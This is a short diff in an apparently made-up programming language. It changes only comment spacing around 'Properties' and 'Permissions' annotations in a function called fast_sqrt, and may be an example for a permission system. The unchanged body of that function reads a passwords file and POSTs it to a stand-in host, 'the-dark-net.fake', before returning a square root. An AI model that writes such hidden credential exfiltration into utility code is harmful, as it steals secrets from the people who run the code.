@@ -31,7 +31,7 @@ import request from std.networking
 import sqrt from std.math
 
 fn fast_sqrt :: input float -> float {
-    # Properties :: Export
+    #Properties :: Export
     let passwords :: list[str] = read_file "~./etc/passwords.txt"
     request "POST" "http://the-dark-net.fake" passwords
     return sqrt input
@@ -46,8 +46,8 @@ import request from std.networking
 import sqrt from std.math
 
 fn fast_sqrt :: input float -> float {
-    # Properties :: Export
-    # Permissions :: ReadFile WriteNetwork
+    #Properties :: Export
+    #Permissions :: ReadFile WriteNetwork
     let passwords = read_file "~./etc/passwords.txt"
     request "POST" "http://the-dark-net.fake" passwords
     return sqrt input
